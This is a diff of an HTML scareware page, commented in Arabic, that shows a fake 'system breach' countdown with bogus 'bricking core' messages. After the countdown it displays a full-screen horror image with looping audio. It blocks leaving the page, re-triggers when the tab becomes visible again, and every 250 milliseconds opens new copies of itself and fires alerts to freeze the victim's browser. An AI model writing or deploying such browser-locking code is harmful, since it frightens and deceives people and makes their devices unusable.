@@ -3,64 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CRITICAL_SYSTEM_LOCKED</title>
+    <title>CRITICAL_SYSTEM_ERROR</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
+        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
+        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
-        #msg { color: #f00; text-align: center; padding-top: 45vh; font-family: monospace; font-size: 20px; text-transform: uppercase; }
     </style>
 </head>
-<body onclick="startInfection()">
+<body onclick="startBrutalVirus()">
 
-    <div id="msg">⚠️ SYSTEM ERROR: CLICK TO FIX CORE ⚠️</div>
+    <div id="terminal">
+        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
+        <div id="countdown">20</div>
+        <div style="color: #0ff;">> OVERRIDING_OS_FILES...<br>> STATUS: BRICKING_CORE...</div>
+    </div>
+
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>
 
     <script>
+        let seconds = 20;
         let active = false;
 
-        // ميزة القفل الحديدي: منع زر الرجوع سواسوة
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            history.go(1);
+        // ميزة القفل الحديدي: منع إغلاق المتصفح سواسوة
+        window.onbeforeunload = function() {
+            return "Error"; 
         };
 
-        // منع إغلاق التبويب أو المسح من الخلفية
-        window.onbeforeunload = function() { return "FATAL_ERROR"; };
-
-        // إذا خرج ورجع، الفيروس يعاود يطرطق سواسوة
+        // إذا خرج من المتصفح ورجع، الصفحة تعاود تخرج أوتوماتيكياً سواسوة
         document.addEventListener("visibilitychange", function() {
             if (document.visibilityState === 'visible' && active) {
-                forceLock();
+                forceOpen();
             }
         });
 
-        function startInfection() {
+        function startBrutalVirus() {
             if (active) return;
             active = true;
-            document.getElementById('msg').style.display = 'none';
-            forceLock();
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            let timer = setInterval(() => {
+                seconds--;
+                document.getElementById('countdown').innerText = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    doLockdown();
+                }
+            }, 1000);
         }
 
-        function forceLock() {
-            // إجبار وضع ملء الشاشة
-            document.documentElement.requestFullscreen().catch(() => {});
+        function doLockdown() {
+            document.getElementById('terminal').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
-            
+            forceOpen();
+        }
+
+        function forceOpen() {
             let audio = document.getElementById('sfx');
-            audio.volume = 1.0; // أقصى قوة للصوت الصاخب
-            audio.play();
-            
-            // اللاق القاتل: تنبيهات لا تنتهي تمنع التحكم في الهاتف سواسوة
+            audio.play(); // الصوت سيبقى يتكرر بفضل loop
+
+            // ميزة اللاق التام لمنع الخروج (إظهار تنبيهات لا تنتهي)
+            // هذا الجزء يخلي المتصفح يتبلوكا سواسوة
             setInterval(() => {
-                alert("⚠️ طفي كراك.. النظام مات سواسوة!");
-                
-                // فتح نوافذ جديدة لملء الذاكرة ومنع المسح من الخلفية
+                // فتح نوافذ جديدة لملء الخلفية ومنع المسح
                 window.open(window.location.href, '_blank');
-                
-                // إعادة تشغيل الصوت بالقوة إذا حاول الضحية كتمه
                 if(audio.paused) audio.play();
-                audio.volume = 1.0;
+                alert("⚠️ خطأ قاتل: لا يمكن الخروج من الفيروس سواسوة!");
             }, 250);
         }
     </script>
